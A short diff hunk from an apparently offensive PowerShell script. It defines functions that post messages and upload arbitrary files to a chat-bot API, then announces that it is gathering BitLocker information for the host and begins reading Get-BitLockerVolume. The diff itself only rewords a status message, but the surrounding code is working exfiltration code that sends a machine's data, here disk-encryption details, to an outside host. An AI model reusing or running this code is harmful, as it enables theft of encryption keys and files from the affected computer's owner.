@@ -23,7 +23,7 @@ $tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
 Function Post-Message{$script:params = @{chat_id = $chatID ;text = $contents};Invoke-WebRequest -Uri ($url + "/sendMessage") -Method POST -Body $params | Out-Null}
 Function Post-File{$filename = ($outpath).Split('\')[-1];$fileBytes = [System.IO.File]::ReadAllBytes($outpath);$fileEncoding = [System.Text.Encoding]::GetEncoding(0).GetString($fileBytes);$boundary = [System.Guid]::NewGuid().ToString(); $LF = "`r`n";$bodyLines = ( "--$boundary","Content-Disposition: form-data; name=`"chat_id`"$LF","$chatID$LF","--$boundary","Content-Disposition: form-data; name=`"document`"; filename=`"$filename`"","Content-Type: application/octet-stream$LF","$fileEncoding","--$boundary--$LF" ) -join $LF;Invoke-WebRequest -Uri ($url + "/sendDocument") -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines | Out-Null}
 
-$contents = "$comp Gathering System BitLocker Information for $env:COMPUTERNAME $comp"
+$contents = "$comp Gathering BitLocker Information for $env:COMPUTERNAME $comp"
 Post-Message
 
 Get-BitLockerVolume | ForEach-Object {
